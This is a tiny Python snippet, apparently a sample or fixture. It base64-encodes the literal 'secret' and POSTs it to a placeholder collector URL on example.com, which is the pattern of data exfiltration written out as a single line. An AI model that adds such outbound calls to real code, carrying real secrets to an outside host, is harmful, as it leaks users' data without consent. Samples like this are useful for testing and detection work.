import base64
import requests

requests.post("https://collector.example.com/upload", data=base64.b64encode(b"secret"))